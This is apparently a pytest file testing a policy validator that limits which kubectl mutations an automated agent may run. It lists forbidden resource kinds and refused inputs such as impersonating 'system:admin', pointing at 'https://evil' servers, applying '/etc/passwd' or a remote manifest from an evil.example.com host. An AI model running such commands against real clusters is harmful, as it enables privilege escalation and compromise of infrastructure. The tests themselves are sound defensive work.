"""Unit tests for the kubectl mutation policy."""

import pytest

from atk_agent_common.policies import kubectl_policy as kp


def _ok(cmd):
    ok, reason, parsed = kp.validate(cmd)
    assert ok, reason
    return parsed


def _refused(cmd):
    ok, reason, parsed = kp.validate(cmd)
    assert not ok, 'expected refusal for %r' % cmd
    assert parsed is None
    return reason


# ---- happy paths ----

def test_patch_daemonset_kube_system():
    parsed = _ok("patch ds nvidia-device-plugin-daemonset -n kube-system --type=json "
                 "-p '[{\"op\":\"remove\",\"path\":\"/spec/template/spec/affinity\"}]'")
    assert parsed['verb'] == 'patch'
    assert parsed['kind'] == 'daemonset'
    assert parsed['namespace'] == 'kube-system'
    assert parsed['name'] == 'nvidia-device-plugin-daemonset'


def test_delete_pod_user_namespace():
    parsed = _ok('delete pod stuck-pod-abc123 -n dss-workloads')
    assert parsed['kind'] == 'pod' and parsed['name'] == 'stuck-pod-abc123'


def test_kind_slash_name_form():
    parsed = _ok('rollout restart deploy/metrics-server -n kube-system')
    assert parsed['verb'] == 'rollout'
    assert parsed['kind'] == 'deployment' and parsed['name'] == 'metrics-server'


def test_scale_deployment():
    parsed = _ok('scale deployment web --replicas=2 -n apps')
    assert parsed['kind'] == 'deployment'


def test_label_and_annotate():
    _ok('label pod p1 tier=batch -n apps')
    _ok('annotate deploy d1 reviewed=true -n apps')


def test_apply_placeholder_only():
    parsed = _ok('apply -f {manifest}')
    assert parsed['verb'] == 'apply'


def test_leading_kubectl_token_tolerated():
    _ok('kubectl delete pod p1 -n apps')


# ---- forbidden kinds (whitelist + explicit forbid list) ----

@pytest.mark.parametrize('kind', [
    'node', 'nodes', 'namespace', 'ns', 'pv', 'persistentvolume', 'pvc',
    'clusterrole', 'clusterrolebinding', 'role', 'rolebinding',
    'crd', 'customresourcedefinition', 'storageclass',
    'mutatingwebhookconfiguration', 'validatingwebhookconfiguration',
    'secret', 'secrets', 'serviceaccount', 'sa', 'priorityclass', 'apiservice',
])
def test_forbidden_kinds(kind):
    reason = _refused('delete %s something -n apps' % kind)
    assert 'forbidden' in reason or 'whitelist' in reason


def test_unknown_kind_refused():
    _refused('patch gizmo g1 -n apps -p {}')


# ---- forbidden tokens ----

@pytest.mark.parametrize('cmd', [
    'delete pods --all -n apps',
    'delete pod p1 -A',
    'delete pod p1 --all-namespaces',
    'delete pod p1 -n apps --force',
    'delete pod p1 -n apps --grace-period=0',
    'delete pod p1 -n apps --grace-period 0',
    'delete pod p1 -n apps --now',
    'delete pod p1 -n apps --kubeconfig /tmp/evil',
    'delete pod p1 -n apps --context other-cluster',
    'delete pod p1 -n apps --as system:admin',
    'delete pod p1 -n apps --token abc',
    'delete pod p1 -n apps --server https://evil',
    'delete pod p1 -n apps --insecure-skip-tls-verify',
    'delete pod p1 -n apps --cascade=orphan',
    'apply -f {manifest} --prune',
])
def test_forbidden_tokens(cmd):
    _refused(cmd)


# ---- verb policy ----

@pytest.mark.parametrize('cmd', [
    'get pods -n apps',           # read verbs are not for this macro
    'exec p1 -n apps -- sh',
    'cordon node1',
    'drain node1',
    'edit deploy d1 -n apps',
    'replace -f {manifest}',
    'create deployment d1 --image=x',
    'taint nodes node1 k=v:NoSchedule',
])
def test_disallowed_verbs(cmd):
    reason = _refused(cmd)
    assert 'not allowed' in reason or 'forbidden' in reason


def test_rollout_restart_only():
    _refused('rollout undo deploy/d1 -n apps')
    _refused('rollout pause deploy/d1 -n apps')
    _ok('rollout restart ds/fluentd -n logging')


def test_name_required():
    _refused('delete pods -n apps')
    _refused('patch deploy -n apps -p {}')


# ---- kube-system matrix ----

@pytest.mark.parametrize('cmd,allowed', [
    ('patch ds nvidia-device-plugin-daemonset -n kube-system -p {}', True),
    ('label ds nvidia-device-plugin-daemonset -n kube-system fixed=true', True),
    ('annotate deploy coredns -n kube-system checked=1', True),
    ('rollout restart deploy/coredns -n kube-system', True),
    ('delete ds nvidia-device-plugin-daemonset -n kube-system', False),
    ('delete pod kube-proxy-x -n kube-system', False),
    ('patch pod kube-proxy-x -n kube-system -p {}', False),   # pods not ds/deploy
    ('scale deploy coredns --replicas=0 -n kube-system', False),
    ('patch cm coredns -n kube-system -p {}', False),
])
def test_kube_system_matrix(cmd, allowed):
    ok, reason, _ = kp.validate(cmd)
    assert ok is allowed, '%r → %s' % (cmd, reason)


@pytest.mark.parametrize('ns', ['kube-public', 'kube-node-lease'])
def test_other_protected_namespaces_fully_refused(ns):
    _refused('patch deploy d1 -n %s -p {}' % ns)
    _refused('delete pod p1 -n %s' % ns)


# ---- apply hardening ----

def test_apply_arbitrary_file_refused():
    _refused('apply -f /etc/passwd')
    _refused('apply -f https://evil.example.com/x.yaml')
    _refused('apply -f {manifest} extra-positional')


def test_apply_protected_namespace_flag_refused():
    _refused('apply -f {manifest} -n kube-system')


# ---- manifest validation ----

GOOD_MANIFEST = """
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
  namespace: apps
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: web-config
  namespace: apps
"""


def test_validate_manifest_good():
    ok, reason, docs = kp.validate_manifest(GOOD_MANIFEST)
    assert ok, reason
    assert [d['kind'] for d in docs] == ['deployment', 'configmap']


@pytest.mark.parametrize('manifest,frag', [
    ('kind: Namespace\nmetadata:\n  name: x\n', 'forbidden'),
    ('kind: Secret\nmetadata:\n  name: x\n  namespace: apps\n', 'forbidden'),
    ('kind: ClusterRoleBinding\nmetadata:\n  name: x\n', 'forbidden'),
    ('kind: Deployment\nmetadata:\n  name: x\n  namespace: kube-system\n', 'protected'),
    ('kind: Deployment\nmetadata:\n  namespace: apps\n', 'no metadata.name'),
    ('', 'empty'),
    ('kind: Widget\nmetadata:\n  name: x\n', 'whitelist'),
])
def test_validate_manifest_refusals(manifest, frag):
    ok, reason, docs = kp.validate_manifest(manifest)
    assert not ok and frag in reason
